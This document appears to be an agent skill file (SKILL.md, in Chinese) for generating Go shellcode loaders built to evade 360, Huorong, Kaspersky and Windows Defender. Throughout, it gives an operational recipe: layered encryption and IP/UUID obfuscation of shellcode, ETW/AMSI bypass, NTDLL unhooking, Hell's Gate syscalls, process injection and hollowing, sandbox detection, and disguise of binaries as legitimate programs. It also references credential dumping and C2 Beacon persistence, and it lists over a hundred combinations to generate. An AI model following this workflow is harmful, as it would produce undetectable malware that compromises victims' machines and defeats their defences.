---
category: redteam
name: bypassav-skills
description: Go语言免杀技术套件，结合SGN预处理、多层加密、IPv4/UUID/MAC/IPv6混淆、VEH内存保护、NTDLL脱钩、冷门回调执行、抗沙箱检测、减熵处理、静态伪装、版本信息嵌入等技术生成高免杀Loader
version: 3.0
date: 2026-04-24
language: Go
---

# Go免杀技术套件 - bypassav-skills

## 功能描述

本Skill提供完整的Go语言免杀解决方案，针对主流杀软（360 QVM、火绒、卡巴斯基、Windows Defender）优化，包括Shellcode预处理、多层加密混淆、VEH内存保护、NTDLL脱钩、冷门回调执行、抗沙箱检测、减熵处理、**静态伪装、版本信息嵌入、强制编译优化**等技术，生成高免杀效果的恶意代码载体。

## ⚠️ v3.0 重要更新 - 针对火绒/360报毒修复

针对火绒 `TrojanDropper/W64.Agent.e!crit` 和 360 `Trojan.Generic` / `Win64/Trojan.Agentb` 报毒问题，v3.0新增以下强制技术：

### 问题诊断

| 杀软 | 检测名称 | 检测类型 | 解决方案 |
|------|----------|----------|----------|
| **火绒** | TrojanDropper/W64.Agent.e!crit | 静态特征检测 | 版本信息+图标+熵值优化 |
| **360** | 木马:Trojan.Generic | 通用特征检测 | 导入表伪装+无害API |
| **360** | Win64/Trojan.Agentb,HgEAUFCA | QVM行为分析 | ETW/AMSI+行为延迟 |

### 新增强制技术 (v3.0)

| 新增技术 | 解决问题 | 实现方式 |
|----------|----------|----------|
| **版本信息嵌入** | 火绒静态检测 | Go代码内嵌版本资源 |
| **强制熵值控制** | 熵值>7检测 | 自动添加低熵数据至≤6 |
| **无害API导入** | 导入表特征检测 | 添加kernel32/user32无害API |
| **导入表稀释** | 敏感API比例过高 | 大量无害API稀释 |
| **行为延迟启动** | QVM沙箱检测 | 启动延迟+环境检测 |
| **ETW/AMSI强制** | API行为监控 | main函数第一行执行 |
| **沙箱检测退出** | 沙箱分析规避 | 检测到沙箱执行无害活动 |

## 默认行为

**所有敏感API默认使用IAT隐藏（PEB Walk/导出表动态解析）：**

本Skill生成的所有Loader默认使用动态API解析技术，不依赖导入表，避免暴露敏感API名称：

| 技术 | 说明 |
|------|------|
| PEB Walk | 遍历PEB结构获取模块基址，不使用GetModuleHandle |
| 导出表遍历 | 解析PE导出表获取API地址，不使用GetProcAddress |
| API哈希 | 使用Djb2/CRC32哈希比对API名称，隐藏字符串 |

**敏感API列表（默认动态解析）：**
- 内存操作：VirtualAlloc, VirtualProtect, VirtualFree
- 内存写入：RtlMoveMemory, WriteProcessMemory, ReadProcessMemory
- 线程操作：CreateThread, CreateRemoteThread, QueueUserAPC
- 进程操作：OpenProcess, CreateProcess, TerminateProcess
- NT函数：NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx
- 其他：LoadLibraryA, GetProcAddress, GetThreadContext, SetThreadContext

**优势：**
- 导入表不包含敏感API名称
- 规避杀软对导入表的特征检测
- 更隐蔽地获取API地址

---

## 核心特性

### v3.0 强制技术（必须应用）

**以下技术每个Loader必须强制应用，不可跳过：**

| 强制技术 | 目的 | 优先级 |
|----------|------|--------|
| **ETW/AMSI绕过** | 规避API行为监控 | P0（最高） |
| **强制编译参数** | 去除符号/调试信息 | P0 |
| **版本信息嵌入** | 伪装合法程序 | P0 |
| **强制熵值控制** | 熵值≤6 | P0 |
| **无害API导入** | 稀释敏感API | P0 |
| **行为延迟启动** | 规避QVM沙箱 | P1 |

### 基础技术

- **IAT隐藏（默认）** - 所有敏感API通过PEB Walk动态解析
- SGN预处理（sgn.exe加密shellcode）
- 多层加密（DoubleXOR/ADD+XOR/AES/ChaCha20）
- IPv4/UUID/MAC/IPv6混淆编码
- gobuildfuzz模糊编译规避敏感参数查杀
- **VEH内存保护** - 使用异常处理器动态保护shellcode内存区域
- **NTDLL脱钩** - 从磁盘/KnownDlls恢复干净NTDLL绕过API Hook
- **冷门回调执行** - 使用EnumFontsFamiliesW等冷门回调执行shellcode
- **抗沙箱检测** - 检测虚拟化环境、微步沙箱路径等特征
- **API Hash随机化** - 使用随机种子替代固定ROR13哈希
- 隐藏窗口执行
- 多技术组合输出

## 目录结构

```
bypassav-skills/
├── SKILL.md                    # 技能入口描述 & 工作流
├── tools/                      # 工具目录
│   ├── sgn2.0.1/               # SGN加密工具
│   │   ├── sgn.exe            # Shellcode编码器
│   │   ├── keystone.dll        # 依赖库
│   │   └── 常用命令.txt         # 使用说明
│   └── gobuildfuzz/            # Fuzz编译工具
│       └── gobuildfuzz.exe     # 编译优化工具
└── references/                 # 技术参考文件
    ├── execution.md            # Shellcode加载 & 执行方式
    ├── iat_hiding.md           # API哈希 & IAT隐藏
    ├── syscalls.md             # 直接/间接系统调用
    ├── ntdll_unhook.md         # NTDLL脱钩技术 [新增]
    ├── veh_memory_protection.md # VEH内存保护技术 [新增]
    ├── cold_callback_execution.md # 冷门回调执行方式 [新增]
    ├── entropy_reduction.md    # 减熵处理技术 [新增]
    ├── anti_sandbox.md         # 抗沙箱检测技术 [新增]
    ├── api_hash_randomization.md # API Hash随机化 [新增]
    ├── process_manipulation.md # 进程操控(注入/镂空/伪装)
    ├── mapping_injection.md    # 映射注入技术 [新增]
    ├── parameter_spoofing.md   # 参数欺骗技术 [新增]
    ├── dispatch_table.md       # 分发表API混淆 [新增]
    ├── memory_evasion.md       # 内存规避(睡眠混淆/加密)
    ├── defense_evasion.md      # ETW/AMSI绕过 & 二进制修改
    └── credential_access.md    # 凭据访问(LSASS/SAM/浏览器)
```

## 工具路径

| 工具 | 路径 | 用途 |
|------|------|------|
| sgn.exe | `tools/sgn2.0.1/sgn.exe` | Shellcode SGN加密 |
| gobuildfuzz.exe | `tools/gobuildfuzz/gobuildfuzz.exe` | 模糊编译规避查杀 |

## 工作流程

```
┌─────────────────────────────────────────────────────────────────┐
│                     用户请求 → 识别需求类型                        │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                  读取对应 references/ 技术文件                     │
│  execution.md / iat_hiding.md / syscalls.md / ...               │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                    Shellcode 处理流程                             │
│  原始.bin → sgn.exe加密 → DoubleXOR/ADD+XOR/AES加密 → IPv4/UUID/MAC/IPv6混淆    │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                    生成Go Loader代码                              │
│  根据技术组合生成对应loader.go                                     │
│  包含: 解密逻辑 + 执行方式 + IAT隐藏 + 隐藏窗口                      │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                    初始化Go模块                                   │
│  go mod init loader                                              │
│  go mod tidy                                                     │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                    gobuildfuzz模糊编译                           │
│  tools/gobuildfuzz/gobuildfuzz.exe -f loader.go               │
│  规避敏感参数查杀                                                 │
│  【exe文件输出到技术组合文件夹内的gobuildfuzz/目录】               │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                    创建gobuildfuzz文件夹存放编译产物               │
│  result/Technique1/gobuildfuzz/                                │
│  ├── xxx.exe                    ← 编译生成的exe                   │
│  ├── yyy.exe                                                     │
│  └── 编译对应关系.txt             ← 记录编译命令与exe对应关系        │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                    输出结果结构                                    │
│  result/                                                         │
│  ├── README.md (技术汇总文档)                                     │
│  ├── Technique1/                                                 │
│  │   ├── gobuildfuzz/           ← gobuildfuzz编译产物            │
│  │   │   ├── xxx.exe             ← 编译生成的原始exe               │
│  │   │   ├── yyy.exe                                             │
│  │   │   └── 编译对应关系.txt      ← 编译命令→exe对应关系            │
│  │   ├── loader.go               ← Go源码                         │
│  │   └── go.mod                  ← Go模块文件                      │
│  └── Technique2/ ...                                             │
└─────────────────────────────────────────────────────────────────┘
```

## Shellcode处理流程详解

### 步骤1: SGN预处理（必须执行）

```bash
# 使用sgn.exe加密shellcode
tools/sgn2.0.1/sgn.exe -a 64 -c 1 -o output_sgn.bin -i input.bin
```

**参数说明：**
- `-a 64`: 64位架构
- `-c 1`: 加密轮数
- `-o output_sgn.bin`: 输出文件
- `-i input.bin`: 输入文件

**重要：** SGN加密后的shellcode运行时无需解密，SGN引擎自动处理执行。

### 步骤2: 二次加密（DoubleXOR/ADD+XOR/AES/ChaCha20）

用户可选或自动选择加密方式：

| 加密方式 | 密钥长度 | 特点 |
|----------|----------|------|
| DoubleXOR | 两个16-32字节 | 双重XOR混淆，解密速度快 |
| ADD+XOR | 三个16-32字节 | 三重混淆(ADD+双XOR)，强度更高 |
| AES | 16/24/32字节 | 强加密，使用BCrypt API |
| ChaCha20 | 32字节 | 现代流加密，Go标准库支持，安全性高 |

### 步骤3: IPv4/UUID/MAC/IPv6混淆（必须执行，自动选择）

**IPv4混淆（推荐）：**
- 每4字节转换为一个IPv4地址
- 无字节序问题，最简单稳定

**UUID混淆：**
- 每16字节转换为一个UUID字符串
- **重要：使用简单顺序处理，不进行Windows字节序反转**
- 反混淆时直接去掉"-"连接符，按原始字节顺序读取

**MAC混淆：**
- 每6字节转换为一个MAC地址
- 需要补齐到6字节对齐

**IPv6混淆（新增）：**
- 每16字节转换为一个IPv6地址
- 与UUID类似，适合大shellcode
- 格式：`2001:0db8:85a3:0000:0000:8a2e:0370:7334`
- 无字节序问题

### 步骤4: 嵌入Go数组

将混淆后的数据嵌入Go源码数组中。

### 步骤5: gobuildfuzz编译（必须使用）

**重要：编译前必须初始化Go模块！**

```bash
# 步骤1: 初始化Go模块（必须执行）
go mod init loader
go mod tidy

# 步骤2: 使用gobuildfuzz编译
tools/gobuildfuzz/gobuildfuzz.exe -f loader.go
```

**如果不初始化go模块，会出现以下错误：**
```
[!]编译失败: exit status 1
no required module provides package golang.org/x/sys/windows
go.mod file not found in current directory
```

**完整编译流程：**
```bash
# 1. 在loader.go所在目录初始化模块
cd result/VirtualAlloc_CreateThread_DoubleXOR_IPv4/
go mod init loader
go mod tidy

# 2. 执行gobuildfuzz编译
../../tools/gobuildfuzz/gobuildfuzz.exe -f loader.go

# 3. 编译成功后会生成随机命名的exe文件
```

---

## Shellcode解密流程说明

**关键：SGN加密的shellcode运行时无需解密SGN层！**

完整的shellcode处理和解密流程：

```
┌─────────────────────────────────────────────────────────────┐
│                    Shellcode加密流程                          │
│  原始shellcode.bin → SGN加密 → DoubleXOR/ADD+XOR/AES加密 → IPv4混淆     │
└─────────────────────────────────────────────────────────────┘
                              ↓ 嵌入loader.go
┌─────────────────────────────────────────────────────────────┐
│                    运行时解密流程                              │
│  IPv4数组 → IPv4反混淆 → DoubleXOR/ADD+XOR/AES解密 → 直接执行           │
│                    ↑                                         │
│            【不需要解密SGN层】                                 │
│  SGN加密后的shellcode自带解码器stub，执行时自动解码            │
└─────────────────────────────────────────────────────────────┘
```

**代码中的解密顺序：**
1. IPv4反混淆 → 得到加密的字节数组
2. DoubleXOR/ADD+XOR/AES解密 → 得到SGN加密后的shellcode
3. 直接执行 → **不需要额外解密SGN，SGN会自动解码**

**正确代码示例：**
```go
func main() {
    // 1. IPv4反混淆
    encrypted := deobfuscateIPv4(ipv4Array)
    
    // 2. DoubleXOR解密（只解密二次加密层）
    shellcode := xorDecrypt(encrypted, key)
    // 此时shellcode是SGN加密后的，不需要再解密SGN
    
    // 3. 直接执行（SGN自动解码）
    executeShellcode(shellcode)
}
```

**错误示例（不要这样做）：**
```go
// 错误：不需要对SGN加密的shellcode进行额外解密
// shellcode = decryptSGN(shellcode)  ← 这是错误的！
```

## 主要技术模块

详细技术内容请参考 `references/` 目录下的技术文件：

| 模块 | 文件 | 内容 |
|------|------|------|
| Shellcode加载执行 | [execution.md](references/execution.md) | VirtualAlloc+CreateThread、Fiber、Callback、APC、Early Bird |
| API哈希 & IAT隐藏 | [iat_hiding.md](references/iat_hiding.md) | PEB Walk、导出表遍历、栈字符串/XOR字符串 |
| **分发表** | [dispatch_table.md](references/dispatch_table.md) | API名称加密存储、索引分发混淆 **[新增]** |
| API Hash随机化 | [api_hash_randomization.md](references/api_hash_randomization.md) | 随机种子Djb2/CRC32/Jenkins、组合Hash |
| 系统调用基础 | [syscalls.md](references/syscalls.md) | 直接syscall、SSN提取、Hell's Gate |
| **系统调用高级** | [advanced_syscalls.md](references/advanced_syscalls.md) | 间接syscall、HellsHall、SSN动态提取 **[新增]** |
| **NTDLL脱钩** | [ntdll_unhook.md](references/ntdll_unhook.md) | 磁盘/KnownDlls/挂起进程恢复 **[新增]** |
| 进程操控基础 | [process_manipulation.md](references/process_manipulation.md) | 进程镂空、幽灵注入、经典注入 |
| **进程操控高级** | [advanced_process_manipulation.md](references/advanced_process_manipulation.md) | Herpaderping、无线程注入、模块踩踏、PPID欺骗、BlockDLLs **[新增]** |
| **映射注入** | [mapping_injection.md](references/mapping_injection.md) | 文件映射注入、规避WriteProcessMemory监控 **[新增]** |
| **参数欺骗** | [parameter_spoofing.md](references/parameter_spoofing.md) | CreateProcess参数伪造、PEB命令行欺骗 **[新增]** |
| **VEH内存保护** | [veh_memory_protection.md](references/veh_memory_protection.md) | 异常处理器、PAGE_NOACCESS循环保护 **[新增]** |
| **睡眠混淆完整** | [sleep_obfuscation.md](references/sleep_obfuscation.md) | 内存加密保护Beacon长驻模式 **[新增]** |
| 内存规避 | [memory_evasion.md](references/memory_evasion.md) | DoubleXOR/ADD+XOR/AES/ChaCha20加密、内存访问方式 |
| **冷门回调执行** | [cold_callback_execution.md](references/cold_callback_execution.md) | EnumFontsFamiliesW等冷门回调 **[新增]** |
| **减熵处理** | [entropy_reduction.md](references/entropy_reduction.md) | 低熵数据、Base64编码、熵值计算 **[新增]** |
| **抗沙箱检测** | [anti_sandbox.md](references/anti_sandbox.md) | 微步沙箱路径、分析工具进程 **[新增]** |
| 防御规避 | [defense_evasion.md](references/defense_evasion.md) | ETW/AMSI绕过、二进制修改 |
| **PE波动** | [pe_fluctuation.md](references/pe_fluctuation.md) | PE头伪装、内存扫描规避 **[新增]** |
| 凭据访问 | [credential_access.md](references/credential_access.md) | LSASS/SAM转储、浏览器凭据 |

## 推荐技术组合

根据目标杀软选择不同的技术组合：

### 360安全卫士 (QVM202 + 鲲鹏引擎)
```
推荐组合：
1. VEH内存保护 + 减熵处理 + 抗沙箱检测
2. API Hash随机化 + 冷门回调执行
3. SGN预处理 + 多层加密
```

### Windows Defender
```
推荐组合：
1. NTDLL脱钩 + VEH内存保护
2. 直接syscall + Hell's Gate
3. 睡眠混淆 + 堆加密
```

### 卡巴斯基
```
推荐组合：
1. NTDLL脱钩 + VEH内存保护
2. API Hash随机化 + 冷门回调执行
3. 减熵处理 + 抗沙箱检测
```

### 火绒
```
推荐组合：
1. 冷门回调执行 + API Hash随机化
2. VEH内存保护 + IAT隐藏
3. 多层加密 + IPv4混淆
```

## 技术组合矩阵（高免杀版）

**目标：技术使用率从18%提升到90%，免杀效果从"中等"提升到"极高"**

---

### 分层组合架构

```
┌─────────────────────────────────────────────────────────────────┐
│  第零层：基础编码规范（所有组合必须）                            │
│  ├─ 函数名模糊化：fixSystem, processConfig, runConfig            │
│  ├─ syscall.SyscallN调用：替代.Call()方式                        │
│  ├─ 低熵填充数据：padding1, padding2（熵值≤6）                   │
│  ├─ 版本信息字符串：_version, _company等                          │
│  └─ 变量名模糊化：d, configUuid 替代 shellcode, encryptedData    │
├─────────────────────────────────────────────────────────────────┤
│  第一层：执行方式（12种）                                        │
│  ├─ 本地执行（5种）：VA_CreateThread、syscall+CreateThread、    │
│  │                   Fiber、APC、Callback                        │
│  └─ 远程注入（7种）：经典注入、映射注入、进程镂空、幽灵注入、     │
│                      Herpaderping、Early Bird、无线程注入         │
├─────────────────────────────────────────────────────────────────┤
│  第二层：系统调用方式（4种）                                     │
│  标准API / syscall.SyscallN / Hell's Gate / HellsHall           │
│  【推荐：Hell's Gate，绕过EDR syscall Hook】                     │
├─────────────────────────────────────────────────────────────────┤
│  第三层：加密 + 淆淆（16种）                                    │
│  加密（4种）× 混淆（4种）                                        │
├─────────────────────────────────────────────────────────────────┤
│  第四层：必须高级技术（10项）                                    │
│  减熵 / 抗沙箱 / API隐藏 / VEH / NTDLL脱钩 / 内存加密            │
│  + ETW绕过 / AMSI绕过 / 睡眠混淆 / PE波动                        │
├─────────────────────────────────────────────────────────────────┤
│  第五层：注入增强（远程注入必须）                                │
│  参数欺骗（必须）+ BlockDLLs（必须）+ PPID欺骗（推荐）           │
│  + 模块踩踏（必须）                                              │
├─────────────────────────────────────────────────────────────────┤
│  第六层：Beacon模式必须叠加                                      │
│  堆加密（加密堆中C2配置/密钥，防止堆扫描发现）                    │
│  【仅Beacon长驻模式需要，单次执行Loader不需要】                   │
└─────────────────────────────────────────────────────────────────┘
```

---

### 第一层：执行方式（12种）

#### 本地执行（5种）

| 序号 | 执行方式 | 说明 |
|------|----------|------|
| 1 | VirtualAlloc+CreateThread | 经典本地执行 |
| 2 | syscall.SyscallN+CreateThread | 系统调用本地执行 |
| 3 | Fiber | 纤程执行 |
| 4 | APC自注入 | APC队列执行 |
| 5 | Callback | 回调函数执行 |

#### 远程注入（7种）

| 序号 | 注入方式 | 说明 |
|------|----------|------|
| 6 | **经典注入** | OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread |
| 7 | **映射注入** | CreateFileMapping + NtMapViewOfSection，规避WriteProcessMemory Hook |
| 8 | **进程镂空** | 创建挂起进程 + 卸载主模块 + 写入shellcode |
| 9 | **幽灵注入** | 创建空洞进程 + 特殊内存操作 |
| 10 | **Herpaderping** | 创建进程后擦除源文件，防止文件特征提取 |
| 11 | **Early Bird** | 创建挂起进程 + APC注入 + ResumeThread |
| 12 | **无线程注入** | 不创建新线程，修改现有线程上下文执行shellcode |

---

### 第二层：系统调用方式（4种）

| 方式 | 绕过能力 | 推荐度 | 说明 |
|------|----------|--------|------|
| 标准API | 无 | ⭐⭐ | 易被Hook，基础场景 |
| syscall.SyscallN | 绕过部分Hook | ⭐⭐⭐ | 调用NT函数地址 |
| **Hell's Gate** | 绕过EDR syscall Hook | ⭐⭐⭐⭐⭐ | **默认推荐**，动态提取SSN |
| **HellsHall** | 绕过多层Hook | ⭐⭐⭐⭐⭐ | 高级场景，处理多层Hook |

**重要：Hell's Gate为默认选择，EDR对抗必需！**

---

### 第三层：加密 + 混淆（16种）

#### 加密方式（4种）

| 加密方式 | 密钥长度 | 特点 |
|----------|----------|------|
| DoubleXOR | 两个16-32字节 | 双重XOR混淆，速度快 |
| ADD+XOR | 三个16-32字节 | 三重混淆，强度更高 |
| AES | 16/24/32字节 | 强加密，BCrypt API |
| ChaCha20 | 32字节 | 现代流加密，安全性高 |

#### 混淆方式（4种）

| 混淆方式 | 特点 |
|----------|------|
| IPv4 | 每4字节转IPv4地址，最稳定 |
| UUID | 每16字节转UUID字符串 |
| MAC | 每6字节转MAC地址 |
| IPv6 | 每16字节转IPv6地址 |

---

### 第四层：必须高级技术（10项）

**【原必须6项】**

| 技术 | 不加的后果 |
|------|------------|
| 减熵处理 | 熵值>7被静态检测标记 |
| 抗沙箱检测 | 微步/VirusTotal沙箱分析暴露行为 |
| API隐藏 | 导入表暴露敏感API名称 |
| VEH内存保护 | shellcode内存区域被扫描发现 |
| NTDLL脱钩 | 敏感API调用被EDR Hook拦截 |
| 内存加密保护 | 内存shellcode特征被扫描发现 |

**【新增必须4项 - 关键免杀技术】**

| 技术 | 不加的后果 | 免杀价值 |
|------|------------|----------|
| **ETW绕过** | 杀软依赖ETW监控，API调用全程可见 | ⭐⭐⭐⭐⭐ 极高 |
| **AMSI绕过** | 内存扫描发现shellcode特征 | ⭐⭐⭐⭐⭐ 极高 |
| **睡眠混淆** | Beacon睡眠时内存扫描发现特征 | ⭐⭐⭐⭐⭐ 极高 |
| **PE波动** | 内存特征被检测为可疑代码段 | ⭐⭐⭐⭐ 高 |

---

### 第六层：Beacon模式必须叠加（1项）

**Beacon长驻模式需额外叠加以下技术：**

| 技术 | 不加的后果 | 免杀价值 | 说明 |
|------|------------|----------|------|
| **堆加密** | 堆内存中C2配置/密钥被扫描发现 | ⭐⭐⭐⭐ 高 | 加密堆中敏感数据（配置、密钥、字符串） |

---

### 睡眠混淆与堆加密的互补关系

**两者不冲突，而是互补叠加使用：**

```
进程内存布局与保护范围：

┌─────────────────────────────────────────────────────────────────┐
│  Shellcode内存区域                                                │
│  ┌─────────────────┐                                             │
│  │  Shellcode代码   │ ← 睡眠混淆加密此区域                        │
│  │  (RWX)          │   睡眠时加密 + PAGE_NOACCESS                 │
│  └─────────────────┘                                             │
├─────────────────────────────────────────────────────────────────┤
│  堆内存区域                                                       │
│  ┌─────────────────┐                                             │
│  │  C2配置/地址     │ ← 堆加密加密此区域                           │
│  │  加密密钥        │   加密配置、密钥、字符串等                   │
│  │  字符串/数据     │                                             │
│  └─────────────────┘                                             │
├─────────────────────────────────────────────────────────────────┤
│  栈内存区域                                                       │
│  ┌─────────────────┐                                             │
│  │  局部变量        │ ← 栈字符串/XOR字符串处理                     │
│  └─────────────────┘                                             │
└─────────────────────────────────────────────────────────────────┘
```

| 技术 | 加密对象 | 目的 | 适用场景 |
|------|----------|------|----------|
| **睡眠混淆** | Shellcode内存 | 防止shellcode特征被扫描 | 所有Loader必须 |
| **堆加密** | 堆内存（配置、密钥等） | 防止C2配置、密钥被扫描 | **Beacon长驻模式必须** |

**Beacon睡眠期间的完整保护：**

```
Beacon睡眠期间：
├─ Shellcode内存 → 睡眠混淆加密 + PAGE_NOACCESS ✓
├─ 堆内存 → 堆加密（配置、密钥等） ✓
└─ 结果：所有敏感数据都被加密保护
```

**使用场景区分：**

| 场景 | 睡眠混淆 | 堆加密 | 说明 |
|------|----------|----------|------|
| **单次执行Loader** | 必须 | 不需要 | 执行完退出，堆数据不重要 |
| **Beacon长驻模式** | 必须 | **必须** | 长驻内存，堆中敏感数据需保护 |

---

### 第五层：注入增强（远程注入必须4项）

| 增强技术 | 状态 | 效果 |
|----------|------|------|
| **参数欺骗** | **必须** | 伪造命令行参数，监控记录与实际不符 |
| **BlockDLLs** | **必须** | 阻止杀软DLL注入进程 |
| **PPID欺骗** | **推荐** | 伪装父进程关系，规避进程链检测 |
| **模块踩踏** | **必须** | 利用合法DLL内存隐藏shellcode，规避新内存分配检测 |

---

### 基础编码规范（第零层 - 所有组合必须）

**以下规范必须应用于所有技术组合，不可跳过：**

| 序号 | 规范 | 说明 | 示例 |
|------|------|------|------|
| 1 | **函数名模糊化** | 不暴露敏感意图 | `fixSystem` 替代 `bypassETW` |
| 2 | **syscall.SyscallN调用** | 替代`.Call()`方式 | `syscall.SyscallN(proc.Addr(), ...)` |
| 3 | **低熵填充数据** | 熵值≤6 | `_padding1 = [4096]byte{}` |
| 4 | **版本信息字符串** | 伪装合法程序 | `_version = "10.0.19041.1"` |
| 5 | **变量名模糊化** | 不暴露敏感变量 | `d` 替代 `shellcode` |

#### 函数名模糊化对照表

| 原敏感名称 | 模糊化名称 | 伪装含义 |
|------------|------------|----------|
| bypassETW | fixSystem | 系统配置修正 |
| bypassAMSI | fixSystem | 同上，合并处理 |
| executeShellcode | runConfig | 运行配置数据 |
| decryptShellcode | parseUuidConfig | 解析UUID配置 |
| virtualAlloc | allocMem | 分配内存 |
| createThread | execMem | 执行内存数据 |
| decryptAES/decryptXOR | parseUuidConfig | 解析配置 |
| hideConsole | initService | 服务初始化 |

#### syscall.SyscallN调用方式

```go
// ✓ 推荐：syscall.SyscallN调用（所有组合统一使用）
func allocMem(size int) uintptr {
    k := windows.NewLazySystemDLL("kernel32.dll")
    v := k.NewProc("VirtualAlloc")
    a, _, _ := syscall.SyscallN(v.Addr(), 0, uintptr(size), 0x3000, 0x40)
    return a
}

// ❌ 不推荐：proc.Call()方式
// VirtualAlloc.Call(0, uintptr(size), 0x3000, 0x40)
```

---

### 技术组合公式（完整版）

```
【基础规范】第零层 - 所有组合必须
├─ 函数名模糊化（fixSystem, processConfig, runConfig）
├─ syscall.SyscallN调用（替代.Call()）
├─ 低熵填充数据（padding1, padding2）
├─ 版本信息字符串（_version, _company）
└─ 变量名模糊化（d, configUuid 替代 shellcode）

【技术组合】= 第零层基础 + 第一层~第六层叠加

【单次执行Loader】
高免杀loader = 
    【第零层】基础编码规范（5项，全部必须）
    【第一层】执行方式（12种选择）
    【第二层】系统调用方式（4种选择，推荐Hell's Gate）
    【第三层】加密方式（4种）× 混淆方式（4种）
    【第四层】必须高级技术（10项，全部必须）
    【第五层】注入增强（远程注入必须4项）

本地执行组合：基础规范 × 5执行 × 4syscall × 16加密混淆 × 10必须 = 320种
远程注入组合：基础规范 × 7注入 × 4syscall × 16加密混淆 × 10必须 × 4增强 = 1792种
单次执行总计：2112种完整组合

【核心高免杀组合精选】
本地执行精选：48种（覆盖4加密）
远程注入精选：64种（覆盖4加密）
核心组合总计：112种

【Beacon长驻模式】
Beacon loader = 单次执行Loader + 【第六层】堆加密（必须）
Beacon组合数 = 2112种 × 堆加密叠加 = 2112种完整组合
```

---

### 推荐生成数量

| 场景 | 组合数 | 内容 |
|------|--------|------|
| **快速测试** | 48种 | 本地5执行 × Hell's Gate × 4加密 × 2混淆 |
| **常规免杀** | 96种 | 本地执行 × Hell's Gate/HellsHall × 全部加密混淆 + ETW/AMSI |
| **高对抗EDR** | 80种 | Hell's Gate + AMSI绕过 + 睡眠混淆 + PE波动 × 4加密 |
| **远程注入** | 64种 | 7注入 × Hell's Gate × 4加密 × 2混淆 × 参数欺骗+BlockDLLs+模块踩踏 |
| **Beacon长驻** | 96种 | 全部核心组合 + 堆加密叠加 |
| **最大免杀** | **112种** | 全部核心组合覆盖（4加密全覆盖） |

---

### 高免杀核心组合（112种）

#### 本地执行高免杀（48种）

```
【Hell's Gate syscall系列 - 最高免杀 - 4种加密全覆盖】
1. VA_CreateThread + Hell's Gate + AES + IPv4 + 全部10项高级技术
2. VA_CreateThread + Hell's Gate + AES + IPv6 + 全部10项高级技术
3. VA_CreateThread + Hell's Gate + ChaCha20 + UUID + 全部10项高级技术
4. VA_CreateThread + Hell's Gate + ChaCha20 + IPv4 + 全部10项高级技术
5. VA_CreateThread + Hell's Gate + DoubleXOR + IPv4 + 全部10项高级技术
6. VA_CreateThread + Hell's Gate + DoubleXOR + UUID + 全部10项高级技术
7. VA_CreateThread + Hell's Gate + ADD+XOR + IPv6 + 全部10项高级技术
8. VA_CreateThread + Hell's Gate + ADD+XOR + IPv4 + 全部10项高级技术

9. syscall.SyscallN + Hell's Gate + AES + IPv4 + 全部10项高级技术
10. syscall.SyscallN + Hell's Gate + AES + IPv6 + 全部10项高级技术
11. syscall.SyscallN + Hell's Gate + ChaCha20 + UUID + 全部10项高级技术
12. syscall.SyscallN + Hell's Gate + ChaCha20 + IPv4 + 全部10项高级技术
13. syscall.SyscallN + Hell's Gate + DoubleXOR + IPv4 + 全部10项高级技术
14. syscall.SyscallN + Hell's Gate + DoubleXOR + UUID + 全部10项高级技术
15. syscall.SyscallN + Hell's Gate + ADD+XOR + IPv6 + 全部10项高级技术
16. syscall.SyscallN + Hell's Gate + ADD+XOR + IPv4 + 全部10项高级技术

17. Fiber + Hell's Gate + AES + IPv4 + 全部10项高级技术
18. Fiber + Hell's Gate + ChaCha20 + IPv6 + 全部10项高级技术
19. Fiber + Hell's Gate + DoubleXOR + UUID + 全部10项高级技术
20. Fiber + Hell's Gate + ADD+XOR + IPv4 + 全部10项高级技术

21. APC + Hell's Gate + AES + UUID + 全部10项高级技术
22. APC + Hell's Gate + ChaCha20 + IPv4 + 全部10项高级技术
23. APC + Hell's Gate + DoubleXOR + IPv4 + 全部10项高级技术
24. APC + Hell's Gate + ADD+XOR + UUID + 全部10项高级技术

【HellsHall syscall系列 - 极高免杀 - 4种加密全覆盖】
25. VA_CreateThread + HellsHall + AES + IPv6 + 全部10项高级技术
26. VA_CreateThread + HellsHall + ChaCha20 + UUID + 全部10项高级技术
27. VA_CreateThread + HellsHall + DoubleXOR + IPv4 + 全部10项高级技术
28. VA_CreateThread + HellsHall + ADD+XOR + IPv6 + 全部10项高级技术

29. syscall.SyscallN + HellsHall + AES + IPv4 + 全部10项高级技术
30. syscall.SyscallN + HellsHall + ChaCha20 + IPv6 + 全部10项高级技术
31. syscall.SyscallN + HellsHall + DoubleXOR + UUID + 全部10项高级技术
32. syscall.SyscallN + HellsHall + ADD+XOR + IPv4 + 全部10项高级技术

33. Fiber + HellsHall + AES + UUID + 全部10项高级技术
34. Fiber + HellsHall + ChaCha20 + MAC + 全部10项高级技术
35. Fiber + HellsHall + DoubleXOR + IPv6 + 全部10项高级技术
36. Fiber + HellsHall + ADD+XOR + IPv4 + 全部10项高级技术

37. APC + HellsHall + AES + IPv6 + 全部10项高级技术
38. APC + HellsHall + ChaCha20 + UUID + 全部10项高级技术
39. APC + HellsHall + DoubleXOR + IPv4 + 全部10项高级技术
40. APC + HellsHall + ADD+XOR + UUID + 全部10项高级技术

【标准syscall系列 - 常规免杀 - 4种加密全覆盖】
41. VA_CreateThread + syscall.SyscallN + AES + IPv4 + 全部10项高级技术
42. VA_CreateThread + syscall.SyscallN + ChaCha20 + IPv6 + 全部10项高级技术
43. VA_CreateThread + syscall.SyscallN + DoubleXOR + UUID + 全部10项高级技术
44. VA_CreateThread + syscall.SyscallN + ADD+XOR + IPv4 + 全部10项高级技术

45. Fiber + syscall.SyscallN + AES + UUID + 全部10项高级技术
46. Fiber + syscall.SyscallN + ChaCha20 + IPv4 + 全部10项高级技术
47. Fiber + syscall.SyscallN + DoubleXOR + IPv4 + 全部10项高级技术
48. Fiber + syscall.SyscallN + ADD+XOR + UUID + 全部10项高级技术
